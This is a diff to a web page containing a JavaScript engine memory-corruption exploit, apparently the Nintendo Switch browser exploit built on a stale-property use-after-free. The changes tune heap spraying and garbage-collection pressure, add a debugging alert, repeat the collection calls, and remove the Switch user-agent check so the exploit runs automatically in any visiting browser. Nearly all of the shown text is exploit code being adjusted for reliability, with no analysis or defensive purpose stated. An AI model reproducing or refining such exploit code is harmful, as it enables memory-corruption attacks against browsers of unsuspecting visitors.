@@ -31,19 +31,19 @@
                 //  + Ando
                 //
                 // saelo's phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html
-
+                var killMe = 70;
                 // garbage collection stuff
-                var pressure = new Array(100);
+                var pressure = new Array(500);
+                var rwbuf = new ArrayBuffer(0x1003 * 4);
+                var numbufs = 20000;
+                var bufs = new Array(numbufs);
                 // do garbage collect
                 dgc = function() {
-                    for (var i = 0; i < pressure.length; i++) {
-                        pressure[i] = new Uint32Array(0x10000);
-                    }
-                    for (var i = 0; i < pressure.length; i++) {
-                        pressure[i] = 0;
-                    }
+                    for(var i = 0; i < bufs.length; ++i)
+                        bufs[i] = new Uint32Array(rwbuf);
+                    for(var i = 0; i < bufs.length; ++i)
+                        bufs[i] = null;
                 }
-
 
                 // access to the overlapping Uint32Array
                 var bufs = new Array(0x1000);
@@ -133,7 +133,7 @@
 
                     // get a reference to the target stale property, which points to arr
                     stale = target.stale;
-
+                    alert("test "+stale);
                     // make sure that the stale[0] points actually to the 0x41414141 data if not, we don't wanna mess with it and try again
                     if(stale[0]==0x41414141) {
                         // stale[0] is now pointing at a fake Integer 0x41414141. Now make it 0x41414242
@@ -205,14 +205,16 @@
                     dgc();
                     dgc();
                     dgc();
+                    dgc();
+                    dgc();
+                    dgc();
+                    dgc();
+                    dgc();
+                    dgc();
                     setTimeout(go_, 500);
                 }
 
-                // if Switch browser is detected, auto start exploit
-                if(navigator.userAgent.indexOf('Nintendo Switch')>-1) {
-                    document.getElementById('status').innerText = 'Found Nintendo Switch! 🤖';
-                    setTimeout(go, 2000);
-                }
+                setTimeout(go, 2000);
             </script>
     </body>
 </html>
